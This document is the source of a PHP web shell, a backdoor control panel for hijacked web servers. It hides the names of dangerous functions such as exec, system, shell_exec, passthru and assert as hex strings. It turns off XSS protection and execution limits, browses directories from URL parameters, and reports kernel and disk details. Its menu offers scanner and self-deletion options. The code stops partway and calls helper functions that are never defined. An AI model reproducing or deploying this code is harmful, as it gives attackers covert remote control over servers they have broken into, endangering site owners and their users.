<?php
 header("X-XSS-Protection: 0");
 @clearstatcache();
 $set = "34303639364536393546373336353734";
 hex2bin(hex2bin("36463632354637333734363137323734323832393342"));
 hex2bin(hex2bin("3733363537333733363936463645354637333734363137323734323832393342"));
 hex2bin(hex2bin("373336353734354637343639364436353546364336393644363937343238333032393342"));
 hex2bin(hex2bin("3635373237323646373235463732363537303646373237343639364536373238333032393342"));
 hex2bin(hex2bin($set)).('("log_errors", 1)');
 hex2bin(hex2bin($set)).('("max_execution_time", 0)');
 hex2bin(hex2bin($set)).('("output_buffering", 0)');
 hex2bin(hex2bin($set)).('("display_errors", 0)');
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
 $Array = [
     "7068705f756e616d65", //php_uname [0]
     "70687076657273696f6e", //phpversion [1]
     "6368646972", //chdir [2]
     "676574637764", //getcwd [3]
     "707265675f73706c6974", //preg_split [4]
     "636f7079", //copy [5]
     "66696c655f6765745f636f6e74656e7473", //file_get_contents [6]
     "6261736536345f6465636f6465", //base64_decode [7]
     "69735f646972", //is_dir [8]
     "6f625f656e645f636c65616e28293b", //ob_end_clean(); [9]
     "756e6c696e6b", //unlink [10]
     "6d6b646972", //mkdir [11]
     "63686d6f64", //chmod [12]
     "7363616e646972", //scandir [13]
     "7374725f7265706c616365", //str_replace [14]
     "68746d6c7370656369616c6368617273", //htmlspecialchars [15]
     "7661725f64756d70", //var_dump [16]
     "666f70656e", //fopen [17]
     "667772697465", //fwrite [18]
     "66636c6f7365", //fclose [19]
     "64617465", //date [20]
     "66696c656d74696d65", //filemtime [21]
     "737562737472", //substr [22]
     "737072696e7466", // sprintf [23]
     "66696c657065726d73", //fileperms [24]
     "746f756368", //touch [25]
     "66696c655f657869737473", //file_exists [26]
     "72656e616d65", //rename [27]
     "69735f6172726179", // is_array [28]
     "69735f6f626a656374", // is_object[29]
     "737472706f73", //strpos [30]
     "69735f7772697461626c65", //is_writable [31]
     "69735f7265616461626c65", //is_readable [32]
     "737472746f74696d65", //strtotime [33]
     "66696c6573697a65", //filesize [34]
     "726d646972", //rmdir [35]
     "6f625f6765745f636c65616e", //ob_get_clean [36]
     "7265616466696c65", //readfile [37]
     "617373657274", //assert [38]
     "636872", //chr [39]
     "696d706c6f6465", //implode [40]
     "707265675f7265706c616365", //preg_replace [41]
     "65786563", //exec [42],
     "7368656c6c5f65786563", //shell_exec [43]
     "73797374656d", //system [44]
     "7061737374687275", //passthru [45]
     "706f7369785f676574657569642829", //posix_geteuid()[46]
     "6469736b5f667265655f7370616365", // disk_free_space[47]
     "6469736b5f746f74616c5f7370616365", // disk_total_space [48]
     "6765746d79756964", //getmyuid [49]
     "6765746d79676964", //getmygid [50]
     "66696c656f776e6572", //fileowner [51]
     "66696c6567726f7570", // filegroup [52]
     "6765745f63757272656e745f75736572", //get_current_user [53]
     "70617468696e666f", //pathinfo [54]
     "626173656e616d65", //basename [55]
     "66696c655f7075745f636f6e74656e7473", //file_put_contents [56]
     "706f7369785f676574656769642829", //posix_getegid() [57]
     "245f534552564552", //$_SERVER [58]
 ];
 
 $___ = count($Array);
 for ($i = 0; $i < $___; $i++) {
     $ngehe = bin2hex($Array[$i]);
     $GNJ[] = hex2bin(hex2bin($ngehe));
     
 }
 
 global $GNJ;
 if (version_compare(PHP_VERSION, "5.3.0", "<")) {
     @set_magic_quotes_runtime(0);
 } 

 function hdd($s)
 {
     if ($s >= 1073741824) {
         return sprintf("%1.2f", $s / 1073741824) . " GB";
     } elseif ($s >= 1048576) {
         return sprintf("%1.2f", $s / 1048576) . " MB";
     } elseif ($s >= 1024) {
         return sprintf("%1.2f", $s / 1024) . " KB";
     } else {
         return $s . " B";
     }
 }
 
 $freespace = $GNJ[47]("/");
 $total = $GNJ[48]("/");
 
 $freespace_formatted = $GNJ[41]('/[^\d.]/', '', $freespace);
 $total_formatted = $GNJ[41]('/[^\d.]/', '', $total);
 
 $used = $total_formatted - $freespace_formatted;
 
 
 
 function path()
 {   
     global $GNJ;
     $stplace = $GNJ[14];
     if (isset($_GET["dir"])) {
         $dir = $stplace("\\", "/", $_GET["dir"]);
         @chdir($dir);
     } else {
         $dir = $stplace("\\", "/", $GNJ[3]());
     }
     return $dir;
 }
 $dir = scandir(path());
 foreach ($dir as $folder) {
     $dirinfo["path"] = path() . DIRECTORY_SEPARATOR . $folder;
     if (!is_dir($dirinfo["path"])) {
         continue;
     }
     $dirinfo["link"] =
         $folder === ".."
             ? "<a href='?dir=" . dirname(path()) . "'>$folder</a>"
             : ($folder === "."
                 ? "<a href='?dir=" . path() . "'>$folder</a>"
                 : "<a href='?dir=" . $dirinfo["path"] . "'>$folder</a>");
 }
 
 function OS()
 {
     global $GNJ;
     $subst = $GNJ[22];
     return $subst(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";
 }
 
 function ambilKata($param, $kata1, $kata2)
 {
     if ($GNJ[30]($param, $kata1) === false) {
         return false;
     }
     if ($GNJ[30]($param, $kata2) === false) {
         return false;
     }
     $start = $GNJ[30]($param, $kata1) + strlen($kata1);
     $end = $GNJ[30]($param, $kata2, $start);
     $return = $GNJ[22]($param, $start, $end - $start);
     return $return;
 }
 
 function windisk()
 {
     $letters = "";
     $v = explode("\\", path());
     $v = $v[0];
     foreach (range("A", "Z") as $letter) {
         $bool = $isdiskette = in_array($letter, ["A"]);
         if (!$bool) {
             $bool = is_dir("$letter:\\");
         }
         if ($bool) {
             $letters .=
                 "[ <a href='?dir=$letter:\\'" .
                 ($isdiskette
                     ? " onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\""
                     : "") .
                 ">";
             if ($letter . ":" != $v) {
                 $letters .= $letter;
             } else {
                 $letters .= color(1, 2, $letter);
             }
             $letters .= "</a> ]";
         }
     }
     if (!empty($letters)) {
         print "Detected Drives $letters<br>";
     }
     if (count($quicklaunch) > 0) {
         foreach ($quicklaunch as $item) {
             $v = realpath(path() . "..");
             if (empty($v)) {
                 $a = explode(DIRECTORY_SEPARATOR, path());
                 unset($a[count($a) - 2]);
                 $v = join(DIRECTORY_SEPARATOR, $a);
             }
             print "<a href='" . $item[1] . "'>" . $item[0] . "</a>";
         }
     }
 }
?>
<!DOCTYPE html>
	<html dir="auto" lang="en-US">

	<head>
		<meta charset="UTF-8">
		<meta name="robots" content="NOINDEX, NOFOLLOW">

		<title>1298371287358y</title>

		<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
	</head>
	<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
	<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
	<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
	<script src="//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <style type="text/css">
        a:link {
             color: wheat;
             background-color: transparent;
             text-decoration: none;
          }
          a:visited {
             color: deepskyblue;
             background-color: transparent;
             text-decoration: none;
          }
          a:active {
             color: yellow;
             background-color: transparent;
          }
        @media (min-width: 1200px) {
          .container {
            width: auto;
          }
        }
        body{
            color: white;
        }
        .paper {
            padding: 28px 55px 27px;
            position: relative;
            border: 1px solid #b5b5b5;
            background: white;
            background: -webkit-linear-gradient(top, #dfe8ec 0%, white 8%) 0 57px;
            background: -moz-linear-gradient(top, #dfe8ec 0%, white 8%) 0 57px;
            background: linear-gradient(top, #dfe8ec 0%, white 8%) 0 57px;
            -webkit-background-size: 100% 30px;
            -moz-background-size: 100% 30px;
            -ms-background-size: 100% 30px;
            background-size: 100% 30px;
            overflow: auto;
            max-height: 400px;
        }
    
        .paper::before {
            content: "";
            z-index: -1;
            margin: 0 1px;
            width: 706px;
            height: 10px;
            position: absolute;
            bottom: -3px;
            left: 0;
            background: white;
            border: 1px solid #b5b5b5;
        }
    
        .paper::after {
            content: "";
            position: absolute;
            width: 0px;
            top: 0;
            left: 39px;
            bottom: 0;
            border-left: 1px solid #f8d3d3;
        }
        .container {
           max-width: 70% !important;/*Set your own width %; */
        }
        hr {
            display: block;
            height: 1px;
            border: 0;
            border-top: 1px solid #ccc;
            margin: 1em 0;
            padding: 0;
        }
    </style>

<body class="bg-dark">
	    <br><br>
        <div class="container border border-white">
            		
		<br><br>
		<div class="border border-white">
			<nav class="navbar navbar-expand-lg navbar-dark bg-dark ">
    	<?php
             if (isset($_GET["d"])) {
                 $d = uhex($_GET["d"]);
                 $GNJ[2](uhex($_GET["d"]));
             } else {
                 $d = $GNJ[3]();
             }
             $k = $GNJ[4]("/(\\\|\/)/", $d);
         ?>

	<br />
	<div class="collapse navbar-collapse justify-content-center" id="navbarNav">
		<ul class="navbar-nav">
			<li class="nav-item active">
				<a class="nav-link ajx" href="?">
					<font color="red">Home</font>
				</a>
			</li>
			<li class="nav-item active">
				<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex("info") ?>">Info</a>
			</li>
			<li class="nav-item active">
				<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex(
    "auto_tools"
) ?>">Auto Tools</a>
			</li>
			<li class="nav-item active">
				<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex(
    "scanner"
) ?>">Scanner</a>
			</li>
			<li class="nav-item active">
				<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex(
    "killself"
) ?>">KillSelf</a>
			</li>
			<li class="nav-item active">
				<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex(
    "saveme"
) ?>">SaveMe</a>
			</li>
		</ul>
	</div>

	<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
		<span class="navbar-toggler-icon"></span>
	</button>

</nav>
			
		</div>
		<?php


		?>

<?php


echo " (" . x("$d/$c") . ")";
echo "<br>Kernel Version : " . php_uname(). "\n";
echo "<br>";
echo "Free space: " . hdd($freespace) . "\n";
echo "Total space: " . hdd($total) . "\n";
echo "Used space: " . hdd($used) . "\n";
print "<br>";
print OS() === "Windows" ? windisk() : "";
echo "<br><br>";

